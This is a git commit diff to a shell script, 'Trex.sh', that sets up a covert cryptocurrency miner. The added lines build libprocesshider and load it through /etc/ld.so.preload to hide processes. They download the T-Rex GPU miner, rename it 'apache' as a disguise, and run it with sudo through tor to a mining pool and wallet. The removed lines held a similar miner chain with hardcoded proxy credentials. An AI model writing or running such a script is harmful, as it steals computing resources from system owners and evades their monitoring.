507a4fc26761ed7e2b9c7d6ffc73dd8ef776c090
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-05-12 10:32:55 +0700

    Update Trex.sh

--- Trex.sh
+++ Trex.sh
@@ -1,48 +1,18 @@
 #!/bin/sh
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
+apt update
+apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
+service tor start
 
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 13.56.193.130:1080
-socks5_username = mikrotik999
-socks5_password = Elibawnos
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
-
-echo "**"
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo "**"
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-make
+git clone https://github.com/hanifgz/libprocesshider.git
+cd libprocesshider;make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+cd ..
 
-./graftcp/graftcp ./bezzHash --url=ssl://3DWPbhBLe3RC4dHP8Y6Wz3QCorqJw4Bgcy@daggerhashimoto.usa-east.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+wget https://github.com/trexminer/T-Rex/releases/download/0.25.15/t-rex-0.25.15-linux.tar.gz
+tar -xf t-rex-0.25.15-linux.tar.gz
+mv t-rex apache
+
+screen sudo ./apache -a etchash -o stratum+tcp://etc.2miners.com:1010 -u 0x11880b1cfe04907c5306222be1e09f4bbb480eb5 -p x --proxy 127.0.0.1:9050 -u teguhcong -w $(echo $(shuf -i 1-2000 -n 1)-Konsol) --gpu-report-interval 5 --mt 1
